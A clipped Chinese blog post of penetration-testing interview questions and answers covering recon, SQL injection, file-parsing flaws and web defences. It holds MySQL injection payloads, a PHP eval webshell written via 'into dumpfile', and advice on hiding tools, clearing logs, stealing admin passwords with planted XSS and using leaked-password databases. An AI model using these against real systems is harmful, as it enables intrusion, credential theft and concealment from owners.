---
title: "一套实用的渗透测试岗位面试题_内网渗透面试题-CSDN博客"
source: "https://blog.csdn.net/haoxuexiaolang/article/details/105145334"
author:
published:
created: 2025-04-29
description: "文章浏览阅读4.2k次，点赞6次，收藏49次。转载自公众号：alisrc1.拿到一个待检测的站，你觉得应该先做什么？1)信息收集  1，获取域名的whois信息,获取注册者邮箱姓名电话等。  2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。  3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞 ..._内网渗透面试题"
tags:
  - "clippings"
---
参考链接1： [https://blog.csdn.net/baozhourui/article/details/88096809](https://blog.csdn.net/baozhourui/article/details/88096809)

参考链接2： [https://www.cnblogs.com/dggsec/p/9239423.html](https://www.cnblogs.com/dggsec/p/9239423.html)

**前言：**

1.这是一份网上找到的、面试率比较高比较全的 [渗透测试](https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020) 面试题，且 **内含大量渗透技巧** 。

2.此文，我对题目做出一定汇总，一方面方便自己日后学习，一方面与大家分享一起进步。

3.另外，此文添加了一些 **记忆方法和技巧** （这是众多文章所不有的先例和大胆创新）

————————————————————————————————————————————————————

#### 面试题

1.拿到一个待检测的站，你觉得应该先做什么？

给你一个网站你是如何来渗透测试的? 在获取书面授权的前提下。

（渗透测试的流程 / 测试流程、漏洞流程 / 渗透测试的原理？）

**【回答】**

宏观上来说：分为渗透前期、中期和后期；

具体来说，流程为： 信息搜集、漏洞挖掘、漏洞利用、权限提升、日志清理、总结报告及修复方案 等

```cobol
版本一：

1)信息收集 

  在信息收集阶段，我们需要掌握目标网站或目标主机足够多的信息，才能更好地对其进行漏洞检测。

  1.通过一些辅助工具，比如站长工具等获取网站域名whois信息,注册者邮箱姓名电话等。（巧记：外围搜集1）

  2.使用搜索引擎，如google hack 探测网站信息以及是否存在后台、敏感文件等。（巧记：外围搜集2）

  3.目标扫描：使用工具比如(nmap/openvas/Nessus等)获取网站的主机IP、开放端口、系统版本、开放服务等基本信息（巧记：目标具体信息）

  4.域名遍历：使用工具比如（dirbuster/御剑后台/Layer子域名挖掘机）获取网站的目录结构信息，域名、子域名等一系列信息（巧记：目标分支信息）

  5.指纹识别：使用工具比如（whatweb/httprint/御剑指纹识别）获取网站的前前后后的信息，如：服务器类型、web容器、脚本类型、数据库类型，技术框架等（巧记:目标其他突破口）

2）漏洞挖掘

   常用漏洞扫描工具，如burpsuite/AWVS/APPscan/OWASP-ZAP/Nessus等，

   另外可以通过一些方法进行漏洞探测，如SQL注入、文件上传、文件包含、命令执行、XSS跨站脚本、CSRF跨站请求伪造、弱口令等

3）漏洞利用

    利用以上的方式和payload模块等拿到webshell或者其他权限后进行修改密码、数据库信息等一系列操作

4）权限提升

    提权服务器，比如：

   windows下windows低版本漏洞提权, serv-u提权, mysql的udf提权等。

   linux下linux内核版本漏洞提权, sudo su提权，mysql system提权、oracle低权限提权以及linux脏牛提权等。

5) 日志清理

6）总结报告及修复方案
```
```html
版本二：

1)信息收集

    1，获取域名的whois信息,获取注册者邮箱姓名电话等。

    2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。

    3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞

    4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。

    5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针

    6，google hack 进一步探测网站的信息，后台，敏感文件

2）漏洞挖掘

    开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，

    远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等

3）漏洞利用

    利用以上的方式拿到webshell，或者其他权限

4）权限提升

    提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权

5) 日志清理

6）总结报告及修复方案
```

2.假设给你一个项目，针对一家企业，你自己怎么进行信息收集？（信息搜集？信息搜集过程）

```cobol
见上一道题
```

3.判断出网站的CMS对渗透有什么意义？

```bash
1. 查看网上是够存在该cms已曝光的程序漏洞（看看是否有现成的漏洞）

 

2. 如果该程序开源，还能下载相对应的源码进行代码审计（没有现成的，尝试代码审计挖漏洞）
```

4.一个成熟并且相对安全的CMS，渗透时 扫目录 的意义？

```cobol
1.判断是否存在敏感文件和站长误操作比如：网站备份的压缩文件、配置说明文件等（巧记：一级目录存在的可能性）

2. 进行二级目录扫描（巧记：二级目录）
```

5.常见的网站服务器容器。

```cobol
IIS、Apache、Tomcat、nginx、Lighttpd

 

巧记（理解记忆法）

IIS是互联网信息服务,是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。

 

Apache：是世界使用排名第一的Web服务器软件

Tomcat: 由Apache组织提供的一种Web服务器

 

Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器

nginx和lighttpd基本上是同质的,都是采用基于epoll/kqueue/select的全异步事件模型,可以轻松地维持大量的连接,不惧怕慢连接攻击
```

6.目前已知哪些版本的容器有解析漏洞，具体举例。

```cobol
解析漏洞主要是一些特殊文件被IIS、Apache、Nginx等Web容器在某种情况下解释成脚本文件格式并执行而产生的漏洞。    

 

 

IIS 6.0       存在目录解析、文件解析、文件类型解析等，会被当做asp文件进行解析。

（1）目录解析：目录名包含.asp .asa .cer这种字样，该目录下所有文件都被当做asp来进行解析;

（2）文件解析：文件名如：xxx.asp;yyy.jpg 的文件，会忽略分号后面的后缀，将该文件当成asp脚本进行解析

（3）文件类型解析：asa、cdx、cer也会被当成asp脚本进行解析，例如：test.asa 、 test.cdx 、 test.cer

 

IIS 7.0/7.5   默认开启Fast-CGI，直接在图片地url址后面输入/1.php，会把正常图片当成php文件进行解析

 

Apache  上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左开始尝试解析，直到遇到一个能解析的扩展名为止。

 

Nginx

1.版本 ≤ 0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。

2.空字节代码 xxx.jpg.php

 

 

进一步学习参考：

https://segmentfault.com/a/1190000016026991

 

https://www.cnblogs.com/shellr00t/p/6426856.html
```

7.mysql 注入点，用工具 对目标站直接写入一句话 ，需要哪些条件？

```cobol
root权限 以及 网站的绝对路径。（巧记：使用最高权限往具体位置写入内容）
```

8.如何手工快速判断目标站是 windows 还是 linux 服务器？

```cobol
linux大小写敏感, windows大小写不敏感。
```

9.为何一个 mysql数据库 的站，只有一个80端口开放？

```cobol
1.3306端口不对外开放（巧记：默认端口3306不开放）

 

2.更改了端口，没有扫描出来。（巧记：默认端口3306被更改了） 

 

3.站库分离（巧记：整个mysql库被隔离了）
```

巧记：

![](https://i-blog.csdnimg.cn/blog_migrate/813607e7ad44d40f97910b3caf5c278a.png)

10、3389无法连接的几种情况

```cobol
1. 没开放3389 端口

 

2. 端口被修改

 

3. 服务器处于内网，需进行端口转发

 

4. 防火墙防护拦截
```

巧记：

![](https://i-blog.csdnimg.cn/blog_migrate/00e736cd7ac0c92b2268e4174ad2b48d.png)

11.如何突破注入时字符被转义？

```cobol
1.宽字符注入

 

2.hex编码绕过

 

巧记（理解记忆法）

1. 宽字节原理：

  参考1: https://blog.csdn.net/qq_40390383/article/details/98214334

  参考2：https://blog.51cto.com/12332766/2146755

2.hex编码原理

  参考：https://www.jianshu.com/p/57c4e8d3f035
```

12.在某后台新闻编辑界面看到编辑器，应该先做什么？

```cobol
查看编辑器的名称版本,然后搜索公开的漏洞。
```

13.拿到一个webshell发现网站根目录下有.htaccess文件 ，我们能做什么？

```cobol
【是什么】

.htaccess是一个纯文本文件，里面存放着Apache服务器配置相关的指令，通过配置该文件可以覆盖掉Apache服务器的默认配置。

 

【用途/利用】    

利用方式还挺多的，下面说一些熟悉的利用。

1、    重定向或重写URL

2、    进行密码保护与验证

   比如: 对指定IP进行密码保护, 对文件进行密码保护

3、    进行访问控制

  比如

  （1）    过滤域名或网络主机

  （2）    限制目录访问

  （3）    禁止访问指定文件

  （4）    指定文件类型

4、    目录浏览与主页

   比如启用浏览器目录浏览、禁止浏览器目录浏览、自定义目录浏览

5. 隐藏网站木马

       

巧记：

    访问URL，登录需要账号和密码，登录后访问受控制，比如目录浏览与主页，附加高级玩法隐藏木马。
```

14.注入漏洞只能查账号密码？

```cobol
还能获取数据库中的数据信息等（只要权限广，脱库脱到老）
```

15.安全狗会追踪变量，从而发现出是一句话木马吗？

```cobol
不一定，安全狗追踪变量是根据特征码来进行的，所以利用一定的技巧很好绕过。（只要思路宽，绕狗绕到欢。）
```

16.access 扫出后缀为asp的数据库文件，访问 乱码 ，如何实现到本地利用？

```cobol
迅雷下载，直接改后缀为.mdb。
```

17.提权时选择可读写目录，为何尽量 不用带空格 的目录？

```perl
因为exp执行多半需要空格界定参数。
```

18.某服务器有站点A、B ，为何在A的后台添加test用户之后，当访问B的后台的时候发现 也添加上了test用户 ？

```cobol
同数据库。
```

19.注入时可以不使用and 或or 或xor，可以直接order by 开始注入吗？

```cobol
and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点，那就可以省那步骤去。
```

20.某个防注入系统，在注入时会提示：

```cobol
系统检测到你有非法注入的行为。

已记录您的ip xx.xx.xx.xx

时间:2020-01-23

提交页面:test.asp?id=15

提交内容:and 1=1

 

巧记：告诉你违法了，并且记录了你的信息（你通过xx主机ip,在xxx时间干了什么事）
```

21、如何利用这个防注入系统拿shell？

```cobol
在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了，这个时候可以尝试寻找网站的配置文件直接上菜刀工具进行连接。

具体文章参见：http://ytxiao.lofter.com/post/40583a_ab36540。
```

22.上传大马后访问乱码时，有哪些解决办法？

```cobol
浏览器中改编码。
```

23.审查上传点的元素有什么意义？（F12检查元素）

```cobol
有些站点的上传文件类型的限制是在前端实现的，此时只要在前端增加上传类型就能突破限制了。
```

24.目标站禁止注册用户，找回密码处随便输入用户名提示：“ 此用户不存在 ”，你觉得这里怎样利用？

```markdown
1. 判断页面是否存在注入漏洞，因为所有和数据库有交互的地方都有可能有注入。

 

2. 若存在注入漏洞，可以尝试先爆破用户名，再利用被爆破出来的用户名爆破密码。
```

25.目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt ，你有什么思路？

```cobol
这就是传说中的下载漏洞！

 

在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里查找网站的配置文件，或许可以找出网站连接的数据库的账号和密码。
```

26.甲给你一个目标站，并且告诉你根目录下 存在/abc/目录 ，并且此目录下 存在编辑器和admin目录 。请问你的想法是？

```cobol
直接在网站二级目录 “/abc/” 下扫描敏感文件及目录。
```

巧记：

![](https://i-blog.csdnimg.cn/blog_migrate/f4efd0679c4e8d9ee117066d164d98d3.png)

27.在 有shell 的情况下，如何使用 xss 实现对目标站的长久控制？

```cobol
在登录后才可以访问的文件中插入XSS脚本，该js脚本在后台登录时会记录登录账号密码，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻路径的文件中或者直接发到自己网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。
```

28.后台修改管理员密码处，原密码显示为\*。你觉得该怎样实现读出这个用户的密码？

```cobol
审查元素，把密码处的password属性改成text就明文显示了。
```

29.目标站无防护，上传图片可以正常访问， 上传脚本格式后访问则403（禁止访问）， 什么原因？

```cobol
原因很多，有可前后端配置对上传的文件类型做出了限制，可以尝试改后缀名绕过
```

30.审查元素得知网站所使用的 防护软件 ，你觉得怎样做到的？

```cobol
当在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，可以使用F12查看HTML体部，比如护卫神就可以在名称那看到<hws>内容<hws>。
```

31\. 在win2003服务器中建立一个.zhongzi文件夹 用意何为？

```cobol
隐藏文件夹，为了不让管理员发现你传上去的工具。（巧记：种子这东西，还是隐藏好，呵呵）
```

32、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：

```cobol
A. demo.jsp?id=2+1     B. demo.jsp?id=2-1

选B，因为在 URL 编码中 + 代表空格，可能会造成混淆
```

33、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？

demo.do?DATA=AjAxNg==

```cobol
DATA可以经过了base64编码再传入服务器来尝试绕过
```

34、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？

```cobol
1. 有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell

 

2.通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 

Shell

 

3.使用 sqlmap –os-shell 原理和上面第一种相同，来直接获得一个 Shell，这样效率更高
```

35、 XSS 、CSRF 和 XXE 有什么区别，以及修复方式？（攻击方式不同）

```cobol
区别（攻击的方式是不同的）

XSS跨站脚本攻击，攻击者构造脚本（一般是Javascript）放置到Web页面，受害者通过点击链接该脚本会被执行，从而受害者受到攻击。

CSRF跨站请求伪造攻击，即攻击者挟持用户账号执行非用户本意的操作。XSS是实现CSRF的诸多手段中的一种。

XXE是XML外部实体注入攻击，利用xml外部实体可以解析外部文件的特性，使得攻击成为可能。

 

 

XSS修复方式（巧记：2个web   2个浏览器）

  1.web客户端和服务器端对用户输入输出字符进行安全过滤和转义 

  2、Web服务器安装WAF/IDS/IPS等安全产品，拦截攻击代码

  3、浏览器设置为高安全级别，设置HTTPOnly为true来禁止JavaScript读取Cookie值

  4、关闭浏览器自动密码填写功能，防止被钓鱼页面/表单调取账号密码

 

CSRF修复方式：

    1. 执行二次认证，如：验证码、再次输入密码、确认弹框等

    2. 在需要防范CSRF的页面嵌入Token

    3. 检测Refer中的会话来源和检测是否存在XSS

 

XXE修复方式：

   1.禁止对XML外部实体的解析（也就调用开发语言禁止xml外部实体解析的函数）

   2.过滤用户提交的XML数据。比如关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。
```

36、CSRF、SSRF和重放攻击有什么区别？

```cobol
CSRF是跨站请求伪造攻击，由客户端发起

SSRF是服务器端请求伪造，由服务器发起

重放攻击是将截获的数据包进行重放，达到身份认证等目的
```

37、说出至少三种 业务逻辑漏洞 ，以及修复方式？

```cobol
逻辑漏洞是指由于程序逻辑不清晰或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误。

（1）密码找回漏洞。存在密码允许暴力破解、通用型找回凭证、找回凭证可以拦包获取、可以跳过验证步骤等方式来通过厂商提供的密码找回功能来得到密码

 

（2）身份认证漏洞。最常见的是会话固定攻击和Cookie仿冒，只要得到 Cookie或Session即可伪造用户身份。

 

（3）验证码漏洞。存在验证码允许暴力破解和抓包改包方式进行绕过

 

巧记：密码找回过程中需要身份认证和验证码。
```

38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？

```cobol
get /ecskins/demo.jsp?uid=2016031900&keyword=”hello world”

HTTP/1.1Host:***.com:82User-Agent:Mozilla/

5.0 Firefox/40Accept:text/css,/;q=0.1

Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3

Referer:http://*******.com/eciop/orderForCC/

cgtListForCC.htm?zone=11370601&v=145902

Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;

uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;

st_uid=N90PLYHLZGJXI-NX01VPUF46W;

status=True

Connection:keep-alive

 

参考第34题。
```

39、sqlmap怎么对一个注入点注入？

```cobol
注入方式

1) 如果是get型,直接sqlmap -u “注入点网址”

2) 如果是post型，可以sqlmap -u "注入点网址” --data="post的参数"

sqlmap运行原理

1.    尝试连接目标网站

2.    确认目标网站是否为动态网页

3.    通过内置方法判断目标网页的数据库类型（比如：通过报错）

4.    开始组合payload并用tamper渲染后发包

巧记：

   连接网站 —> 确认网页 —> 判断数据库 —> 开始渲染渗透
```

40、 nmap 扫描的几种方式

```cobol
1.基于主机扫描  nmap -sn

2.基于端口扫描  nmap -sS

3.基于系统扫描  nmap -O

4.基于服务扫描  nmap -sV

5.综合扫描     nmap -A
```

41、sql注入的几种类型？

```cobol
1）报错注入

2）bool型注入（逻辑注入/数字注入）

3）延时注入

4）宽字节注入

5) UNION注入
```

42、 报错注入的函数 有哪些？ 10大函数

```cobol
1.floor()  mysql中用来取整的函数

  id = 1 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a);

 

2.exp() 此函数返回e(自然对数的底)指数X的幂值

  id =1 and EXP(~(SELECT * from(select user())a));

 

3.extractvalue()  是mysql对xml文档数据进行查询的xpath函数

  id = 1 and (extractvalue(1, concat(0x5c,(select user()))));

 

4.updatexml()  mysql对xml文档数据进行查询和修改的xpath函数

  id = 1 and (updatexml(0x3a,concat(1,(select user())),1));

 

5.multipoint()

  id = 1 and multipoint((select * from(select * from(select user())a)b));

 

6.polygon()

  id =1 and polygon((select * from(select * from(select user())a)b));

 

7.multipolygon()

  id =1 and multipolygon((select * from(select * from(select user())a)b));

 

8.linestring()

  id = 1 and LINESTRING((select * from(select * from(select user())a)b));

 

9.multilinestring()

  id = 1 and multilinestring((select * from(select * from(select user())a)b));

 

10.GeometryCollection()

  id = 1 AND GeometryCollection((select * from (select * from(select user())a)b));

 

 

巧记：

floor

exp          extractvalue

updatexml

multipoint   polygon      multipolygon

             linestring   multilinestring  

GeometryCollection
```

43、延时注入如何来判断？

```cobol
if( ascii( substr(“hello”, 1, 1) )=104, sleep(5), 1)   或者 ' or sleep(5) -- '
```

44、盲注和延时注入的 共同点？

```cobol
都是一个字符一个字符的判断
```

45、如何拿一个网站的webshell？（本质：渗透测试流程）

```markdown
1. 通过SQL注入、文件上传、文件包含、命令执行、XSS跨站脚本、CSRF跨站请求伪造、弱口令等方式拿到webshell

 

2. 另外可以通过一些已经爆出的cms漏洞拿webshell，比如wordpress上传插件时包含脚本文件zip压缩包，dedecms后台可以直接建立脚本文件等
```

46、sql注入写文件都有哪些函数？

```csharp
select '一句话' into outfile '路径'

select '一句话' into dumpfile '路径'

比如：

    select '<?php eval($_POST[1]) ?>' into dumpfile 'd:\wwwroot\baidu.com\nvhack.php';
```

47、如何防止CSRF?

```cobol
参考第35题。
```

48、 owasp 漏洞都有哪些 ？

```cobol
OWASP 十大漏洞

1、SQL注入（排名top1）

2、失效的身份认证和会话管理

3、跨站脚本攻击XSS (排名top3)

4、直接引用不安全的对象

5、安全配置错误

6、敏感信息泄露

7、缺少功能级的访问控制

8、跨站请求伪造CSRF

9、使用含有已知漏洞的组件

10、未验证的重定向和转发
```

49、SQL注入防护方法？

```cobol
1、不要信任用户的输入，对用户的输入进行安全校验、可以通过正则表达式、限制输入长度对特殊字符进行过滤或转换等。（巧记：SQL探测不通过）

2、不要使用管理员等高权限的数据库连接，为每个应用使用单独的权限有限的账号。（巧记：SQL探测通过，但账号权限有限）

3、不要把机密信息直接明文存放，采用加密或哈希（加盐）处理敏感的信息。（巧记：SQL探测通过，账号通过，但内容加密）

4、应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装（巧记：高阶玩法——包装错误）
```

50、代码执行，文件读取，命令执行的函数都有哪些？

```cobol
1）代码执行：

   eval(), assert(),create_function(), （3个）

   preg_replace(), array_map(),

   call_user_func()/call_user_func_array ()

 

2）文件读取：

   file(), fgets()，fopen()，fread(), file_get_contents()等（5个）

 

3)命令执行：

   system(), exec(), shell_exec(), passthru()等（4个）

 

 

 

【拓展】

PHP能远程执行的函数

参考：php调用远程url：https://www.cnblogs.com/fffr/p/6556483.html    

 

     fsockopen、fopen、file_get_contents函数等

（巧记：建立链接找到文件，打开文件，找到其中的内容）
```

51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？

```cobol
src指定一个远程的脚本文件获取referer。

 

 

总结：

 

获取管路员路径办法

1. img标签的onerror属性

2. src指定一个远程的脚本文件获取referer
```

52\. mysql的网站注入，5.0以上和5.0以下有什么区别？

```cobol
5.0 以下没有information_schema这个系统表，无法列表名等，只能通过暴力跑表名。

 

5.0 以下是多用户单操作，5.0以上是多用户多操作。
```

53\. 在渗透过程中，收集目 标站注册人邮箱 对我们有什么价值？

```cobol
1. 把邮箱丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行后台登录。

 

2.用邮箱做关键词进行丢进搜索引擎，利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。

 

3.社工库找出社交账号，里面或许会找出管理员设置密码的习惯。

 

4.利用已有信息生成专用字典。（巧记：根据管理员设置习惯生成专用字典进行爆破）

 

5.观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。（巧记：第三方辅助）

 

 

巧记：

 

（1）直接获得密码： 1. 当前邮箱 ——> 社工库

 

 

（2）破解密码（找到设置密码的习惯）

 

2. “当前邮箱” ——> 搜索引擎,得到其他邮箱，即社交账号

                         ——>  3 社工库——> 社交账号密码-设置密码习惯  

 

                         ——>  4. 利用已有信息生成专用字典 

 

5.观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。
```

实付 元

[使用余额支付](https://blog.csdn.net/haoxuexiaolang/article/details/)

点击重新获取

扫码支付

钱包余额 0

抵扣说明：

1.余额是钱包充值的虚拟货币，按照1:1的比例进行支付金额的抵扣。  
2.余额无法直接购买下载，可以购买VIP、付费专栏及课程。

[余额充值](https://i.csdn.net/#/wallet/balance/recharge)

举报

 [![](https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/Group.png) 点击体验  
DeepSeekR1满血版](https://ai.csdn.net/?utm_source=cknow_pc_blogdetail&spm=1001.2101.3001.10583) 隐藏侧栏 ![程序员都在用的中文IT技术交流社区](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_app.png)

程序员都在用的中文IT技术交流社区

![专业的中文 IT 技术社区，与千万技术人共成长](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_wechat.png)

专业的中文 IT 技术社区，与千万技术人共成长

![关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！](https://g.csdnimg.cn/side-toolbar/3.6/images/qr_video.png)

关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！

客服 返回顶部

![](https://i-blog.csdnimg.cn/blog_migrate/813607e7ad44d40f97910b3caf5c278a.png) ![](https://i-blog.csdnimg.cn/blog_migrate/00e736cd7ac0c92b2268e4174ad2b48d.png) ![](https://i-blog.csdnimg.cn/blog_migrate/f4efd0679c4e8d9ee117066d164d98d3.png)